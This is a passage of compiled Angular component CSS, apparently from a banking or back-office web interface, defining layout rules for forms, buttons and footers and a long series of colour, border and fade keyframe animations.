        .manchester.quickOptionsContextualMode[_ngcontent-c14] .manchester-content-holder-middle[_ngcontent-c14] {
            max-height: 360px
        }

        .manchester.debstorAdministrationMode[_ngcontent-c14] {
            margin-top: -77px
        }

        .manchester.fullHeightOverlapping[_ngcontent-c14] .manchester-content[_ngcontent-c14] .manchester-content-holder[_ngcontent-c14] .manchester-content-holder-footer[_ngcontent-c14] {
            position: absolute;
            width: 100%;
            bottom: 0;
            left: 0
        }

        .manchester.debtorsMode[_ngcontent-c14] .manchester-content[_ngcontent-c14] .manchester-content-holder[_ngcontent-c14] .manchester-content-holder-middle[_ngcontent-c14] {
            white-space: normal
        }

        @media only screen and (min-width:1024px) {
            .manchester.quickOptionsSideMode.count-1[_ngcontent-c14] {
                height: 65px !important;
                margin-top: 40px
            }

            .manchester.quickOptionsSideMode.count-2[_ngcontent-c14] {
                height: 100px !important;
                margin-top: 25px
            }

            .manchester.fullHeightOverlapping[_ngcontent-c14] .manchester-content[_ngcontent-c14] .manchester-content-holder[_ngcontent-c14] .manchester-content-holder-indicator.qOitemOne[_ngcontent-c14] {
                top: 80px
            }

            .manchester.fullHeightOverlapping[_ngcontent-c14] .manchester-content[_ngcontent-c14] .manchester-content-holder[_ngcontent-c14] .manchester-content-holder-indicator.qOitemTwo[_ngcontent-c14] {
                top: 150px
            }

            .manchester.fullHeightOverlapping[_ngcontent-c14] .manchester-content[_ngcontent-c14] .manchester-content-holder[_ngcontent-c14] .manchester-content-holder-indicator.qOitemThree[_ngcontent-c14] {
                top: 230px
            }

            .manchester.fullHeightOverlapping[_ngcontent-c14] .manchester-content[_ngcontent-c14] .manchester-content-holder[_ngcontent-c14] .manchester-content-holder-indicator.qOitemFour[_ngcontent-c14] {
                top: 310px
            }

            .manchester.fullHeightOverlapping[_ngcontent-c14] .manchester-content[_ngcontent-c14] .manchester-content-holder[_ngcontent-c14] .manchester-content-holder-indicator.qOitemFive[_ngcontent-c14] {
                top: 390px
            }

            .manchester.fullHeightOverlapping[_ngcontent-c14] .manchester-content[_ngcontent-c14] .manchester-content-holder[_ngcontent-c14] .manchester-content-holder-indicator.qOitemSix[_ngcontent-c14] {
                top: 475px
            }

            .manchester.fullHeightOverlapping[_ngcontent-c14] .manchester-content[_ngcontent-c14] .manchester-content-holder[_ngcontent-c14] .manchester-content-holder-indicator.qOitemSeven[_ngcontent-c14] {
                top: 520px
            }

            .manchester.fullHeightOverlapping[_ngcontent-c14] .manchester-content[_ngcontent-c14] .manchester-content-holder[_ngcontent-c14] .manchester-content-holder-indicator.bottom-fix[_ngcontent-c14],
            .manchester.fullHeightOverlapping[_ngcontent-c14] .manchester-content[_ngcontent-c14] .manchester-content-holder[_ngcontent-c14] .manchester-content-holder-indicator.top-fix[_ngcontent-c14] {
                display: none
            }
        }
    </style>
<style>
        .venecia-form[_ngcontent-c15] {
            padding: 0;
            white-space: normal
        }

        .orphanScopeMode[_ngcontent-c15] .venecia-form[_ngcontent-c15] {
            padding-top: 20px;
            padding-bottom: 10px
        }

        .thirdPartyProductsGroupListMode[_ngcontent-c15] {
            padding: 10px 20px
        }

        .thirdPartyProductsGroupListMode[_ngcontent-c15] .venecia-main-form-required[_ngcontent-c15] {
            margin-right: 0
        }

        .venecia-main-form-required[_ngcontent-c15] {
            height: 10px;
            border-left: 3px solid #0097c1;
            line-height: .4;
            padding-left: 8px;
            margin-top: -15px;
            margin-right: -22px;
            float: right
        }

        .venecia-main-form-required[_ngcontent-c15]:before {
            clear: both
        }

        .venecia-main-form-required.no-show[_ngcontent-c15] {
            display: none
        }

        .specialRequired[_ngcontent-c15] .venecia-main-form-required[_ngcontent-c15] {
            margin-top: -10px;
            margin-right: 0
        }

        .mediumTopRightMode[_ngcontent-c15] .venecia-main-form-required[_ngcontent-c15] {
            margin-top: -15px;
            margin-right: -15px
        }

        .specialRequired.no-msg-required[_ngcontent-c15] .venecia-main-form-required[_ngcontent-c15] {
            display: none
        }

        .venecia-main-form-required-text[_ngcontent-c15] {
            line-height: 0;
            font-size: 11px
        }

        textarea[_ngcontent-c15] {
            resize: none
        }

        .insideMessageMode[_ngcontent-c15] .venecia-form[_ngcontent-c15] {
            padding: 0
        }

        @media only screen and (max-width:767px) and (min-width:320px) {
            .venecia-form[_ngcontent-c15] {
                padding: 0 0 20px
            }
        }

        .backoffice [_nghost-c15] .dynamicRequest[_ngcontent-c15] .venecia-main-form-required[_ngcontent-c15],
        .backoffice [_nghost-c15] .requestDefinitionMode[_ngcontent-c15] .venecia-main-form-required[_ngcontent-c15],
        .backoffice [_nghost-c15] .requestProcessingMode[_ngcontent-c15] .venecia-main-form-required[_ngcontent-c15] {
            margin-right: 0
        }

        .officialReceiptMode[_ngcontent-c15] .venecia-form[_ngcontent-c15] {
            position: relative;
            width: 100%
        }
    </style>
<style>
        .ipswich-main-form-title[_ngcontent-c17] {
            font-size: 16px;
            margin: 16px 0;
            padding: 0;
            color: #12447f;
            font-weight: 400
        }

        .ipswich-main-form-line-separator[_ngcontent-c17] {
            height: 1px;
            width: 100%;
            background: #e1e1e1;
            margin: 2px 0
        }

        .confirmationMode[_ngcontent-c17] {
            display: inline-block
        }

        .thirdPartyProductsGroupAdminItemsListMode[_ngcontent-c17] .ipswich-main-form-line-separator[_ngcontent-c17] {
            margin-top: 16px
        }
    </style>
<style>
        .footer[_ngcontent-c19] {
            height: 42px;
            background: #f8f8f8;
            border-top: 1px solid #d7d7d7;
            padding: 4px 14px 2px
        }

        .footer.no-show[_ngcontent-c19] {
            display: none
        }
    </style>
<style>
        .ipswich-main-buttons-link[_ngcontent-c8] {
            background: #0097c1;
            width: 125px;
            height: 30px;
            text-align: center;
            cursor: pointer;
            display: block;
            margin-left: 0;
            -webkit-animation: .3s fromHumming-birdtoSharkBackground;
            animation: .3s fromHumming-birdtoSharkBackground
        }

        .ipswich-main-buttons-link.darkButtonsMode[_ngcontent-c8] {
            background: 0 0;
            border: 1px solid #fff;
            -webkit-animation: none;
            animation: none
        }

        .ipswich-main-buttons-link.darkButtonsMode[_ngcontent-c8] .ipswich-main-buttons-link-text[_ngcontent-c8] {
            color: #fff
        }

        .ipswich-main-buttons-link.darkButtonsMode[_ngcontent-c8]:hover {
            background: #fff;
            -webkit-animation: none;
            animation: none
        }

        .ipswich-main-buttons-link.darkButtonsMode[_ngcontent-c8]:hover .ipswich-main-buttons-link-text[_ngcontent-c8] {
            color: #333
        }

        .ipswich-main-buttons-link[_ngcontent-c8] i[_ngcontent-c8] {
            color: #fff;
            display: inline-block;
            vertical-align: top;
            padding-top: 7px;
            margin-right: 2px;
            font-size: 16px;
            font-weight: 700 !important
        }

        .ipswich-main-buttons-link[_ngcontent-c8] i.no-show[_ngcontent-c8] {
            display: none
        }

        .ipswich-main-buttons-link-text[_ngcontent-c8] {
            display: inline-block;
            padding-top: 5px;
            color: #fff;
            font-size: 14px;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
            max-width: 115px
        }

        .ipswich-main-buttons-link[_ngcontent-c8]:hover {
            background: #005b75;
            -webkit-animation: .3s fromSharktoHumming-birdBackground;
            animation: .3s fromSharktoHumming-birdBackground
        }

        .ipswich-main-buttons-link.inactive[_ngcontent-c8]:hover {
            -webkit-animation: 0 fromZebratoZebraBackground;
            animation: 0 fromZebratoZebraBackground
        }

        .ipswich-main-buttons-link.bold[_ngcontent-c8] {
            font-family: dinBold
        }

        .ipswich-main-buttons-link.big[_ngcontent-c8] {
            width: 190px;
            height: 39px;
            text-align: center;
            display: block;
            padding-top: 5px
        }

        .ipswich-main-buttons-link.big[_ngcontent-c8] .ipswich-main-buttons-link-text[_ngcontent-c8] {
            font-size: 15px;
            padding-top: 3px;
            max-width: 180px
        }

        .ipswich-main-buttons-link.small[_ngcontent-c8] {
            width: 100px;
            height: 28px;
            text-align: center;
            display: block;
            padding-top: 1px
        }

        .ipswich-main-buttons-link.small[_ngcontent-c8] .ipswich-main-buttons-link-text[_ngcontent-c8] {
            font-size: 14px;
            padding-top: 2px;
            max-width: 90px
        }

        .ipswich-main-buttons-link-simple[_ngcontent-c8] {
            width: 125px;
            height: 30px;
            text-align: center;
            display: block;
            margin-left: 0;
            border: 1px solid transparent;
            cursor: pointer;
            -webkit-animation: .3s fromSharktobettafighterBorder;
            animation: .3s fromSharktobettafighterBorder
        }

        .ipswich-main-buttons-link-simple.highlightMode[_ngcontent-c8] {
            font-family: dinMedium
        }

        .ipswich-main-buttons-link-simple.darkButtonsMode[_ngcontent-c8] {
            -webkit-animation: none;
            animation: none
        }

        .ipswich-main-buttons-link-simple.darkButtonsMode[_ngcontent-c8] .ipswich-main-buttons-link-simple-text[_ngcontent-c8] {
            color: #fff
        }

        .ipswich-main-buttons-link-simple.darkButtonsMode[_ngcontent-c8]:hover {
            -webkit-animation: none;
            animation: none;
            border: 1px solid #fff
        }

        .ipswich-main-buttons-link-simple.darkButtonsMode[_ngcontent-c8]:hover .ipswich-main-buttons-link-simple-text[_ngcontent-c8] {
            color: #fff
        }

        .ipswich-main-buttons-link-simple[_ngcontent-c8] i[_ngcontent-c8] {
            color: #0097c1;
            display: inline-block;
            vertical-align: top;
            padding-top: 7px;
            margin-right: 2px
        }

        .ipswich-main-buttons-link-simple[_ngcontent-c8] i.no-show[_ngcontent-c8] {
            display: none
        }

        .ipswich-main-buttons-link-simple.inactive[_ngcontent-c8],
        .ipswich-main-buttons-link-simple.inactive[_ngcontent-c8]:hover {
            border: 1px solid transparent;
            -webkit-animation: 0 frombettafightertobettafighterBorder;
            animation: 0 frombettafightertobettafighterBorder
        }

        .ipswich-main-buttons-link-simple.inactive[_ngcontent-c8] .ipswich-main-buttons-link-simple-text[_ngcontent-c8],
        .ipswich-main-buttons-link-simple.inactive[_ngcontent-c8]:hover .ipswich-main-buttons-link-simple-text[_ngcontent-c8] {
            color: #b7efff
        }

        .ipswich-main-buttons-link-simple[_ngcontent-c8]:hover {
            border: 1px solid #0097c1;
            -webkit-animation: .3s frombettafightertoSharkBorder;
            animation: .3s frombettafightertoSharkBorder
        }

        .ipswich-main-buttons-link-simple[_ngcontent-c8]:hover .ipswich-main-buttons-link-simple-text[_ngcontent-c8] {
            color: #005b75
        }

        .ipswich-main-buttons-link-simple.bold[_ngcontent-c8] {
            font-weight: 700
        }

        .ipswich-main-buttons-link-simple.big[_ngcontent-c8] {
            height: 39px;
            text-align: center;
            display: block;
            padding-top: 5px
        }

        .ipswich-main-buttons-link-simple.big[_ngcontent-c8] .ipswich-main-buttons-link-simple-text[_ngcontent-c8] {
            font-size: 15px;
            padding-top: 3px
        }

        .ipswich-main-buttons-link-simple.small[_ngcontent-c8] {
            width: 100px;
            height: 28px;
            text-align: center;
            display: block;
            padding-top: 1px
        }

        .ipswich-main-buttons-link-simple.small[_ngcontent-c8] .ipswich-main-buttons-link-simple-text[_ngcontent-c8] {
            font-size: 14px;
            padding-top: 2px;
            max-width: 90px
        }

        .ipswich-main-buttons-link-simple-text[_ngcontent-c8] {
            display: inline-block;
            padding-top: 4px;
            color: #0097c1;
            font-size: 14px;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
            max-width: 115px
        }

        .ipswich-main-buttons-link.button-action-completed[_ngcontent-c8] {
            font-family: streamline !important;
            background: #00a756;
            -webkit-animation: fromCatdarktoCatBackground;
            animation: fromCatdarktoCatBackground
        }

        .ipswich-main-buttons-link.button-action-completed[_ngcontent-c8] .ipswich-main-buttons-link-text[_ngcontent-c8] {
            content: " ... ";
            display: none
        }

        .ipswich-main-buttons-link.button-action-completed[_ngcontent-c8]:after {
            color: #fff;
            font-size: 20px
        }

        .ipswich-main-buttons-link.button-action-completed[_ngcontent-c8]:hover {
            background: #00743c;
            -webkit-animation: fromCattoCatdarkBackground;
            animation: fromCattoCatdarkBackground
        }

        .ipswich-main-buttons-link-icon[_ngcontent-c8] {
            margin-top: -1px;
            font-size: 18px
        }

        .ipswich-main-buttons-link.button-loading[_ngcontent-c8] {
            padding-top: 1px;
            padding-bottom: 1px;
            cursor: default;
            background: #0097c1;
            -webkit-animation: fromSharktoSharkBackground;
            animation: fromSharktoSharkBackground
        }

        .ipswich-main-buttons-link.button-loading[_ngcontent-c8]:hover {
            background: #0097c1;
            -webkit-animation: fromSharktoSharkBackground;
            animation: fromSharktoSharkBackground
        }

        .ipswich-main-buttons-link.button-loading[_ngcontent-c8] .ipswich-main-buttons-link-text[_ngcontent-c8] {
            margin: 2px auto;
            font-size: 9px;
            position: relative;
            text-indent: -9999em;
            border-top: .5em solid rgba(255, 255, 255, .1);
            border-right: .5em solid rgba(0, 0, 0, .3);
            border-bottom: .5em solid rgba(0, 0, 0, .3);
            border-left: .5em solid rgba(255, 255, 255, .1)
        }

        .button-loading[_ngcontent-c8] .ipswich-main-buttons-link-text[_ngcontent-c8],
        .button-loading[_ngcontent-c8] .ipswich-main-buttons-link-text[_ngcontent-c8]:after {
            border-radius: 50%;
            width: 10em;
            height: 10em
        }

        .button-loading[_ngcontent-c8] .ipswich-main-buttons-link-text[_ngcontent-c8] {
            width: 25px;
            height: 25px;
            margin: auto;
            max-width: 100%;
            max-height: 100%;
            overflow: auto
        }

        @media only screen and (max-width:1023px) and (min-width:768px) {
            .ipswich-main-buttons-link.big[_ngcontent-c8] {
                width: 125px;
                height: 32px;
                padding-top: 2px
            }

            .ipswich-main-buttons-link-simple.big[_ngcontent-c8] {
                height: 32px;
                padding-top: 1px
            }
        }

        @media only screen and (max-width:767px) and (min-width:320px) {
            .ipswich-main-buttons-link.big.pfmActivateMode[_ngcontent-c8] {
                width: 220px
            }
        }

        @media only screen and (max-width:639px) and (min-width:320px) {

            .ipswich-main-buttons-link-simple.responsiveHide640Mode[_ngcontent-c8],
            .ipswich-main-buttons-link.responsiveHide640Mode[_ngcontent-c8] {
                display: none
            }
        }

        @media only screen and (max-width:479px) and (min-width:320px) {
            .ipswich-main-buttons-link.big[_ngcontent-c8] {
                width: 100px
            }

            .ipswich-main-buttons-link[_ngcontent-c8],
            .ipswich-main-buttons-link-simple[_ngcontent-c8] {
                width: auto;
                min-width: 85px
            }
        }

        .backoffice [_nghost-c8] .ipswich-main-buttons-link[_ngcontent-c8] {
            background: #fff;
            border: 1px solid #ff4800;
            -webkit-animation: none;
            animation: none
        }

        .backoffice [_nghost-c8] .ipswich-main-buttons-link[_ngcontent-c8] .ipswich-main-buttons-link-text[_ngcontent-c8] {
            color: #ff4800
        }

        .backoffice [_nghost-c8] .ipswich-main-buttons-link[_ngcontent-c8] .ipswich-main-buttons-link-text[_ngcontent-c8]:hover {
            color: #ff4800
        }

        .backoffice [_nghost-c8] .ipswich-main-buttons-link[_ngcontent-c8]:hover {
            background: #fff
        }

        .backoffice [_nghost-c8] .ipswich-main-buttons-link[_ngcontent-c8]:hover .ipswich-main-buttons-link-text[_ngcontent-c8] {
            text-decoration: underline
        }

        .backoffice [_nghost-c8] .ipswich-main-buttons-link.inactive[_ngcontent-c8] .ipswich-main-buttons-link-text[_ngcontent-c8] {
            text-decoration: none;
            color: #b7efff
        }

        .backoffice [_nghost-c8] .ipswich-main-buttons-link.boDarkMode[_ngcontent-c8] {
            border: 1px solid #2e2e2e
        }

        .backoffice [_nghost-c8] .ipswich-main-buttons-link.boDarkMode[_ngcontent-c8] .ipswich-main-buttons-link-text[_ngcontent-c8] {
            color: #2e2e2e
        }

        .backoffice [_nghost-c8] .ipswich-main-buttons-link.previewBTNMode[_ngcontent-c8] {
            width: auto;
            padding: 0 10px
        }

        .backoffice [_nghost-c8] .ipswich-main-buttons-link[_ngcontent-c8] i[_ngcontent-c8] {
            color: #00a756;
            display: inline-block;
            vertical-align: top;
            padding-top: 7px;
            margin-right: 2px;
            font-size: 16px;
            font-weight: 700 !important
        }

        .backoffice [_nghost-c8] .ipswich-main-buttons-link-simple-text[_ngcontent-c8] {
            color: #2e2e2e
        }

        .backoffice [_nghost-c8] .ipswich-main-buttons-link-simple[_ngcontent-c8] {
            -webkit-animation: none;
            animation: none;
            border: 1px solid #2e2e2e
        }

        .backoffice [_nghost-c8] .ipswich-main-buttons-link-simple[_ngcontent-c8]:hover {
            border: 1px solid #2e2e2e
        }

        .backoffice [_nghost-c8] .ipswich-main-buttons-link-simple[_ngcontent-c8]:hover .ipswich-main-buttons-link-simple-text[_ngcontent-c8] {
            color: #2e2e2e;
            text-decoration: underline
        }

        @-webkit-keyframes fromSharktoHumming-bird {
            0% {
                color: #0097c1
            }

            100% {
                color: #005b75
            }
        }

        @keyframes fromSharktoHumming-bird {
            0% {
                color: #0097c1
            }

            100% {
                color: #005b75
            }
        }

        @-webkit-keyframes fromHumming-birdtoShark {
            0% {
                color: #005b75
            }

            100% {
                color: #0097c1
            }
        }

        @keyframes fromHumming-birdtoShark {
            0% {
                color: #005b75
            }

            100% {
                color: #0097c1
            }
        }

        @-webkit-keyframes fromSharktoHumming-birdBackground {
            0% {
                background: #0097c1
            }

            100% {
                background: #005b75
            }
        }

        @keyframes fromSharktoHumming-birdBackground {
            0% {
                background: #0097c1
            }

            100% {
                background: #005b75
            }
        }

        @-webkit-keyframes fromHumming-birdtoSharkBackground {
            0% {
                background: #005b75
            }

            100% {
                background: #0097c1
            }
        }

        @keyframes fromHumming-birdtoSharkBackground {
            0% {
                background: #005b75
            }

            100% {
                background: #0097c1
            }
        }

        @-webkit-keyframes fromDevilfishtoHummingbirdBackground {
            0% {
                background: #12447f
            }

            100% {
                background: #005b75
            }
        }

        @keyframes fromDevilfishtoHummingbirdBackground {
            0% {
                background: #12447f
            }

            100% {
                background: #005b75
            }
        }

        @-webkit-keyframes fromSharktoDevilfishBackground {
            0% {
                background: #12447f
            }

            100% {
                background: #0097c1
            }
        }

        @keyframes fromSharktoDevilfishBackground {
            0% {
                background: #12447f
            }

            100% {
                background: #0097c1
            }
        }

        @-webkit-keyframes fromDevilfishtoSharkBackground {
            0% {
                background: #0097c1
            }

            100% {
                background: #12447f
            }
        }

        @keyframes fromDevilfishtoSharkBackground {
            0% {
                background: #0097c1
            }

            100% {
                background: #12447f
            }
        }

        @-webkit-keyframes fromBettafightertoCrabBackgroundAndSize {
            0% {
                background: 0 0;
                -webkit-transform: scale(.7);
                transform: scale(.7)
            }

            100% {
                background: rgba(0, 0, 0, .05);
                -webkit-transform: scale(.7);
                transform: scale(.7)
            }
        }

        @keyframes fromBettafightertoCrabBackgroundAndSize {
            0% {
                background: 0 0;
                -webkit-transform: scale(.7);
                transform: scale(.7)
            }

            100% {
                background: rgba(0, 0, 0, .05);
                -webkit-transform: scale(.7);
                transform: scale(.7)
            }
        }

        @-webkit-keyframes ListDetailBkgfromBettafightertoCrab {
            0% {
                width: 7px;
                top: 8px;
                left: 19px;
                height: 16px;
                background: 0 0
            }

            100% {
                width: 30px;
                top: 2px;
                left: 8px;
                height: 28px;
                background: rgba(0, 0, 0, .05)
            }
        }

        @keyframes ListDetailBkgfromBettafightertoCrab {
            0% {
                width: 7px;
                top: 8px;
                left: 19px;
                height: 16px;
                background: 0 0
            }

            100% {
                width: 30px;
                top: 2px;
                left: 8px;
                height: 28px;
                background: rgba(0, 0, 0, .05)
            }
        }

        @-webkit-keyframes ListDetailBkgfromCrabtoBettafighter {
            0% {
                width: 30px;
                top: 2px;
                left: 8px;
                height: 28px;
                background: rgba(0, 0, 0, .05)
            }

            100% {
                width: 7px;
                top: 8px;
                left: 19px;
                height: 16px;
                background: 0 0
            }
        }

        @keyframes ListDetailBkgfromCrabtoBettafighter {
            0% {
                width: 30px;
                top: 2px;
                left: 8px;
                height: 28px;
                background: rgba(0, 0, 0, .05)
            }

            100% {
                width: 7px;
                top: 8px;
                left: 19px;
                height: 16px;
                background: 0 0
            }
        }

        @-webkit-keyframes ListRowHoverInLineAndBackground {
            0% {
                border: 1px solid transparent;
                background: #fff
            }

            100% {
                border: 1px solid #12447f;
                background: #f8f8f8
            }
        }

        @keyframes ListRowHoverInLineAndBackground {
            0% {
                border: 1px solid transparent;
                background: #fff
            }

            100% {
                border: 1px solid #12447f;
                background: #f8f8f8
            }
        }

        @-webkit-keyframes ListRowHoverInLineAndBackgroundWarning {
            0% {
                border: 1px solid transparent;
                background: #fef6d1
            }

            100% {
                border: 1px solid #12447f;
                background: #fef6d1
            }
        }

        @keyframes ListRowHoverInLineAndBackgroundWarning {
            0% {
                border: 1px solid transparent;
                background: #fef6d1
            }

            100% {
                border: 1px solid #12447f;
                background: #fef6d1
            }
        }

        @-webkit-keyframes ListRowHoverInLineAndBackgroundAlert {
            0% {
                border: 1px solid transparent;
                background: #fffbeb
            }

            100% {
                border: 1px solid #12447f;
                background: #fffbeb
            }
        }

        @keyframes ListRowHoverInLineAndBackgroundAlert {
            0% {
                border: 1px solid transparent;
                background: #fffbeb
            }

            100% {
                border: 1px solid #12447f;
                background: #fffbeb
            }
        }

        @-webkit-keyframes TabsColorHoverIn {
            0% {
                color: #666
            }

            100% {
                color: #0097c1
            }
        }

        @keyframes TabsColorHoverIn {
            0% {
                color: #666
            }

            100% {
                color: #0097c1
            }
        }

        @-webkit-keyframes TabsColorHoverOut {
            0% {
                color: #0097c1
            }

            100% {
                color: #666
            }
        }

        @keyframes TabsColorHoverOut {
            0% {
                color: #0097c1
            }

            100% {
                color: #666
            }
        }

        @-webkit-keyframes InboxHoverIn {
            0% {
                width: 50%;
                top: 20%;
                left: 20%;
                height: 50%
            }

            100% {
                width: 100%;
                top: 0;
                left: 0;
                height: 100%;
                background: rgba(0, 0, 0, .2)
            }
        }

        @keyframes InboxHoverIn {
            0% {
                width: 50%;
                top: 20%;
                left: 20%;
                height: 50%
            }

            100% {
                width: 100%;
                top: 0;
                left: 0;
                height: 100%;
                background: rgba(0, 0, 0, .2)
            }
        }

        @-webkit-keyframes UserUtilitiesHoverIn {
            0% {
                width: 80%;
                top: 10%;
                left: 10%;
                height: 80%
            }

            100% {
                width: 100%;
                top: 0;
                left: 0;
                height: 100%;
                background: rgba(0, 0, 0, .2)
            }
        }

        @keyframes UserUtilitiesHoverIn {
            0% {
                width: 80%;
                top: 10%;
                left: 10%;
                height: 80%
            }

            100% {
                width: 100%;
                top: 0;
                left: 0;
                height: 100%;
                background: rgba(0, 0, 0, .2)
            }
        }

        @-webkit-keyframes LogoutHoverIn {
            0% {
                width: 80%;
                top: 10%;
                left: 10%;
                height: 80%
            }

            100% {
                width: 100%;
                top: 0;
                left: 0;
                height: 100%;
                background: rgba(0, 0, 0, .2)
            }
        }

        @keyframes LogoutHoverIn {
            0% {
                width: 80%;
                top: 10%;
                left: 10%;
                height: 80%
            }

            100% {
                width: 100%;
                top: 0;
                left: 0;
                height: 100%;
                background: rgba(0, 0, 0, .2)
            }
        }

        @-webkit-keyframes ContactUsHoverIn {
            0% {
                width: 80%;
                top: 10%;
                left: 10%;
                height: 80%
            }

            100% {
                width: 100%;
                top: 0;
                left: 0;
                height: 100%;
                background: rgba(0, 0, 0, .2)
            }
        }

        @keyframes ContactUsHoverIn {
            0% {
                width: 80%;
                top: 10%;
                left: 10%;
                height: 80%
            }

            100% {
                width: 100%;
                top: 0;
                left: 0;
                height: 100%;
                background: rgba(0, 0, 0, .2)
            }
        }

        @-webkit-keyframes LanguageOptionsHoverIn {
            0% {
                width: 80%;
                top: 10%;
                left: 10%;
                height: 80%
            }

            100% {
                width: 100%;
                top: 0;
                left: 0;
                height: 100%;
                background: rgba(0, 0, 0, .2)
            }
        }

        @keyframes LanguageOptionsHoverIn {
            0% {
                width: 80%;
                top: 10%;
                left: 10%;
                height: 80%
            }

            100% {
                width: 100%;
                top: 0;
                left: 0;
                height: 100%;
                background: rgba(0, 0, 0, .2)
            }
        }

        @-webkit-keyframes fromZebratoZebraBackground {

            0%,
            100% {
                background: #b7efff
            }
        }

        @keyframes fromZebratoZebraBackground {

            0%,
            100% {
                background: #b7efff
            }
        }

        @-webkit-keyframes fromSharktoSharkBackground {

            0%,
            100% {
                background: #0097c1
            }
        }

        @keyframes fromSharktoSharkBackground {

            0%,
            100% {
                background: #0097c1
            }
        }

        @-webkit-keyframes frombettafightertobettafighterBorder {

            0%,
            100% {
                border: 1px solid transparent
            }
        }

        @keyframes frombettafightertobettafighterBorder {

            0%,
            100% {
                border: 1px solid transparent
            }
        }

        @-webkit-keyframes fromSharktobettafighterBorder {
            0% {
                border: 1px solid #0097c1
            }

            100% {
                border: 1px solid transparent
            }
        }

        @keyframes fromSharktobettafighterBorder {
            0% {
                border: 1px solid #0097c1
            }

            100% {
                border: 1px solid transparent
            }
        }

        @-webkit-keyframes frombettafightertoSharkBorder {
            0% {
                border: 1px solid transparent
            }

            100% {
                border: 1px solid #0097c1
            }
        }

        @keyframes frombettafightertoSharkBorder {
            0% {
                border: 1px solid transparent
            }

            100% {
                border: 1px solid #0097c1
            }
        }

        @-webkit-keyframes from0to360Rotate {
            0% {
                -webkit-transform: rotate3d(0, 0, 1, 0deg);
                transform: rotate3d(0, 0, 1, 0deg)
            }

            100% {
                -webkit-transform: rotate3d(0, 0, 1, 360deg);
                transform: rotate3d(0, 0, 1, 360deg)
            }
        }

        @keyframes from0to360Rotate {
            0% {
                -webkit-transform: rotate3d(0, 0, 1, 0deg);
                transform: rotate3d(0, 0, 1, 0deg)
            }

            100% {
                -webkit-transform: rotate3d(0, 0, 1, 360deg);
                transform: rotate3d(0, 0, 1, 360deg)
            }
        }

        @-webkit-keyframes fromCatdarktoCatBackground {
            0% {
                background: #00743c
            }

            100% {
                background: #00a756
            }
        }

        @keyframes fromCatdarktoCatBackground {
            0% {
                background: #00743c
            }

            100% {
                background: #00a756
            }
        }

        @-webkit-keyframes fromCattoCatdarkBackground {
            0% {
                background: #00a756
            }

            100% {
                background: #00743c
            }
        }

        @keyframes fromCattoCatdarkBackground {
            0% {
                background: #00a756
            }

            100% {
                background: #00743c
            }
        }

        @-webkit-keyframes fromBettafightertoSharkBorderBottom {
            0% {
                border-bottom: 1px solid transparent
            }

            100% {
                border-bottom: 1px solid #0097c1
            }
        }

        @keyframes fromBettafightertoSharkBorderBottom {
            0% {
                border-bottom: 1px solid transparent
            }

            100% {
                border-bottom: 1px solid #0097c1
            }
        }

        @-webkit-keyframes fromSharktoBettafighterBorderBottom {
            0% {
                border-bottom: 1px solid #0097c1
            }

            100% {
                border-bottom: 1px solid transparent
            }
        }

        @keyframes fromSharktoBettafighterBorderBottom {
            0% {
                border-bottom: 1px solid #0097c1
            }

            100% {
                border-bottom: 1px solid transparent
            }
        }

        @-webkit-keyframes fromBettafightertoCrabBackground {
            0% {
                background: 0 0
            }

            100% {
                background: rgba(0, 0, 0, .05)
            }
        }

        @keyframes fromBettafightertoCrabBackground {
            0% {
                background: 0 0
            }

            100% {
                background: rgba(0, 0, 0, .05)
            }
        }

        @-webkit-keyframes fromCrabtoBettafighterBackground {
            0% {
                background: rgba(0, 0, 0, .05)
            }

            100% {
                background: 0 0
            }
        }

        @keyframes fromCrabtoBettafighterBackground {
            0% {
                background: rgba(0, 0, 0, .05)
            }

            100% {
                background: 0 0
            }
        }

        @-webkit-keyframes from0to100Height {
            0% {
                height: 0
            }

            100% {
                height: auto
            }
        }

        @keyframes from0to100Height {
            0% {
                height: 0
            }

            100% {
                height: auto
            }
        }

        @-webkit-keyframes fromAutoto0Height {
            0% {
                height: auto
            }

            100% {
                height: 0
            }
        }

        @keyframes fromAutoto0Height {
            0% {
                height: auto
            }

            100% {
                height: 0
            }
        }

        @-webkit-keyframes from0to90Rotate3D {
            0% {
                -webkit-transform: rotate3d(0, 0, 1, 0deg);
                transform: rotate3d(0, 0, 1, 0deg)
            }

            100% {
                -webkit-transform: rotate3d(0, 0, 1, 90deg);
                transform: rotate3d(0, 0, 1, 90deg)
            }
        }

        @keyframes from0to90Rotate3D {
            0% {
                -webkit-transform: rotate3d(0, 0, 1, 0deg);
                transform: rotate3d(0, 0, 1, 0deg)
            }

            100% {
                -webkit-transform: rotate3d(0, 0, 1, 90deg);
                transform: rotate3d(0, 0, 1, 90deg)
            }
        }

        @-webkit-keyframes from90to0Rotate3D {
            0% {
                -webkit-transform: rotate3d(0, 0, 1, 90deg);
                transform: rotate3d(0, 0, 1, 90deg)
            }

            100% {
                -webkit-transform: rotate3d(0, 0, 1, 0deg);
                transform: rotate3d(0, 0, 1, 0deg)
            }
        }

        @keyframes from90to0Rotate3D {
            0% {
                -webkit-transform: rotate3d(0, 0, 1, 90deg);
                transform: rotate3d(0, 0, 1, 90deg)
            }

            100% {
                -webkit-transform: rotate3d(0, 0, 1, 0deg);
                transform: rotate3d(0, 0, 1, 0deg)
            }
        }

        @-webkit-keyframes fadeIn {
            0% {
                opacity: 0
            }

            100% {
                opacity: 1
            }
        }

        @keyframes fadeIn {
            0% {
                opacity: 0
            }

            100% {
                opacity: 1
            }
        }

        @-webkit-keyframes fadeOutTableCell {
            0% {
                visibility: visible;
                opacity: 1;
                display: table-cell
            }

            99% {
                visibility: visible;
                opacity: 0;
                display: table-cell
            }

            100% {
                visibility: hidden;
                display: none
            }
        }

        @keyframes fadeOutTableCell {
            0% {
                visibility: visible;
                opacity: 1;
                display: table-cell
            }

            99% {
                visibility: visible;
                opacity: 0;
                display: table-cell
            }

            100% {
                visibility: hidden;
                display: none
            }
        }

        @-webkit-keyframes MonitorFadeIn {
            0% {
                width: 80px
            }

            100%,
            40% {
                width: 100%
            }
        }

        @keyframes MonitorFadeIn {
            0% {
                width: 80px
            }

            100%,
            40% {
                width: 100%
            }
        }

        @-webkit-keyframes MonitorFadeOut {

            0%,
            50% {
                width: 100%
            }

            100% {
                width: 80px
            }
        }

        @keyframes MonitorFadeOut {

            0%,
            50% {
                width: 100%
            }

            100% {
                width: 80px
            }
        }

        @-webkit-keyframes BatchMonitorFadeIn {

            0%,
            40% {
                max-height: 0
            }

            100% {
